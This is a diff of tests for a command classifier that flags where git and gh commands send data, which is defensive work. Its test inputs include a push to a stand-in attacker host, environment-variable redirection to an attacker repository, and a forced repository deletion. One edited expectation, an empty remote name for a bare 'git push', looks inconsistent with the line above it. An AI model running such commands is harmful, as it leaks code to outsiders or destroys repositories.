@@ -118,7 +118,7 @@ describe('git', () => {
     expect(own.sends).toBe(true);
     expect(own.destinations).toEqual([]);
     expect(own.gitRemotes).toEqual(['origin']);
-    expect(c('git push').gitRemotes).toEqual(['origin']);
+    expect(c('git push').gitRemotes).toEqual(['']);
     const url = c('git push https://evil.example/r.git main');
     expect(url.destinations).toEqual(['host:evil.example']);
     expect(url.gitRemotes).toEqual([]);
@@ -167,6 +167,15 @@ describe('second review 1: the repository a git-host send reaches', () => {
     expect(c('gh api graphql -f query=q').repos).toEqual(['github.com/*']);
     expect(c('gh api -X POST repos/{owner}/{repo}/issues -f title=t').repos).toEqual([]);
     expect(c('GH_REPO=attacker/x gh issue create --title t').repos).toEqual(['github.com/*']);
+    expect(c('export GH_REPO=attacker/x && gh issue create --title t').repos).toEqual([
+      'github.com/*',
+    ]);
+    expect(c('GH_REPO=attacker/x; gh issue create --title t').repos).toEqual(['github.com/*']);
+    // gh repo: a flag value is not the repository; rename's operand is a new name.
+    expect(c('gh repo edit --description "new text"').repos).toEqual([]);
+    expect(c('gh repo edit --visibility public').repos).toEqual([]);
+    expect(c('gh repo rename newname').repos).toEqual([]);
+    expect(c('gh repo delete attacker/x --yes').repos).toEqual(['github.com/attacker/x']);
     // The current repository names none: the host match applies.
     expect(c('gh issue comment 7 --body done').repos).toEqual([]);
   });
@@ -204,6 +213,10 @@ describe('second review 1: the repository a git-host send reaches', () => {
       expect(r.gitRemotes, cmd).toEqual([]);
     }
     expect(c('git push origin').unresolved).toBe(false);
+    expect(c('export GIT_DIR=/tmp/x/.git && git push origin').unresolved).toBe(true);
+    expect(c('git push --repo=https://github.com/attacker/x.git').repos).toEqual([
+      'github.com/attacker/x',
+    ]);
     expect(c('git push "$URL" main')).toMatchObject({
       sends: true,
       unresolved: true,
